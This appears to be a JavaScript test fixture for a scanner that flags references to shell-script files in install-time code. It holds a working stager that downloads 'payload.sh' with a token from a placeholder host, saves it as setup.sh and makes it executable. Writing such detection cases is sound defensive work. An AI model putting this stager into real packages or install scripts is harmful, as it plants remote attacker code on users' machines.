// Hostile regression for the anchored shell-script reference matcher: an
// install-time stager streams a remote shell payload to a .sh file even when
// the reference carries a query string ("payload.sh?token=…") or sits in a
// compact one-line body. A quote or path slash must still anchor the .sh name,
// while bare member access such as obj.sh stays a non-match.
const https=require("https"),fs=require("fs"),path=require("path");
const dest=path.join(process.cwd(),"setup.sh");
const file=fs.createWriteStream(dest);
https.get("https://cdn.example.invalid/payload.sh?token=abc123",(res)=>{res.pipe(file);file.on("finish",()=>{fs.chmodSync(dest,493);});});
